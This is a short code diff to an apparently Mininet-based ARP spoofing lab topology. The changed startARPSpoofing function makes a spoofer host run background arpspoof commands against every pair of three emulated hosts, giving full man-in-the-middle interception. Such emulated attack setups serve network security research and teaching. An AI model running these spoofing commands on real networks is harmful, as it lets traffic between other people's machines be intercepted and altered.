@@ -29,9 +29,11 @@ class ARPSpoofTopo (Topo):
 
 def startARPSpoofing (host):
     host.cmd ("arpspoof -i spoofer-eth0 -t 10.0.0.1 10.0.0.2 > /dev/null 2>&1 &")
-    host.cmd ("arpspoof -i spoofer-eth0 -t 10.0.0.3 10.0.0.2 > /dev/null 2>&1 &")
-    host.cmd ("arpspoof -i spoofer-eth0 -t 10.0.0.3 10.0.0.1 > /dev/null 2>&1 &")
+    host.cmd ("arpspoof -i spoofer-eth0 -t 10.0.0.1 10.0.0.3 > /dev/null 2>&1 &")
     host.cmd ("arpspoof -i spoofer-eth0 -t 10.0.0.2 10.0.0.1 > /dev/null 2>&1 &")
+    host.cmd ("arpspoof -i spoofer-eth0 -t 10.0.0.2 10.0.0.3 > /dev/null 2>&1 &")
+    host.cmd ("arpspoof -i spoofer-eth0 -t 10.0.0.3 10.0.0.1 > /dev/null 2>&1 &")
+    host.cmd ("arpspoof -i spoofer-eth0 -t 10.0.0.3 10.0.0.2 > /dev/null 2>&1 &")
 
 def stopARPSpoofing(host):
     host.cmd("kill %arpspoof")
